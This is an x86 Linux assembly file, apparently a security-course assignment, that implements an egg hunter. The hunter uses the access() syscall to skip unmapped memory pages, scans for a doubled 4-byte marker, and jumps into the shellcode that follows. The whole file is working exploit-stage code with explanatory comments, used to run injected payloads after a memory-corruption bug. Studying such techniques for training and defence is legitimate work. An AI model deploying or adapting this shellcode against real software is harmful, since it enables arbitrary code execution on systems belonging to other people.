;; SLAE Assignment #3: EGG Hunter Using Access Method
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400


global _start

section .text
_start:

  mov ebx, 0x50905090             ; Store EGG in ebx
	xor ecx, ecx                    ; Zero out ECX
	mul ecx                         ; Zero out EAX and EDX
next_page:                        ; JMP to increment page number, because if an address in the page is invalid, all other addresses in the page are invalid. 
	or dx, 0xfff                    ; Align page address
next_address:                     ; JMP to increment address
	inc edx                         ; If the address was invalid, this line finishes the alignment. Otherwise it will simply increment edx to check the next address. 
	pushad                          ; Push general registers onto stack
	lea ebx, [edx+4]                ; [edx+4] so we can compare [edx] and [edx+4] at the same time  ebx must contain the pointer to the address to be validated, which is pointed by edx, The +4 is an optimization.
	mov al, 0x21                    ; syscall for access()
	int 0x80                        ; call access() to check memory location [EBX]  
	cmp al, 0xf2                    ; Did it return EFAULT?  (0xf2==EFAULT)
	popad                           ; Restore registers
	jz next_page                    ; access() returned EFAULT, skip page
	cmp [edx], ebx                  ; initialized memory, check if EGG is in [EBX]  
	jnz next_address                ; EGG isn't in [edx], visit next address
	cmp [edx+4], ebx                ; EGG is found in [edx], is it in [edx+4
	jne next_address                ; if it does not contain the second egg, then the hunter found itself! Go to next_addres
	jmp edx                         ; [edx][edx+4] contain EGGEGG, we found our shellcode! Execute meaningless EGGEGG instructions then our payload  
